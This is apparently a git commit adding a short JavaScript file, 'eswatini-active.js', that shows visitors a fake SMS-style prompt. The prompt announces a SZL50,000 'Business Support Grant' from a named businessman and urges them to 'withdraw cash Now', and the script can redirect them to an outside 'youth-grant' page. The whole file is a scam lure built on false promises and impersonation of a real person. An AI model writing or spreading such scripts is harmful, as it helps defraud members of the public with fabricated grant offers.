00f73f227b7e06c6e77483397a68a38db47c48a7
itidnewblog1 <newblog1itid@gmail.com>
2025-09-20 16:52:53 +0100

    Create eswatini-active.js

---
+++ eswatini-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW SZL50,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive SZL50,000 Business Support Grant from Nathan Kirsh, Press Ok to withdraw cash Now ','WITHDRAW SZL50,000');
+if (password != 'WITHDRAW SZL50,000') {
+location.href='https://rhward.org/youth-grant.html';
+}
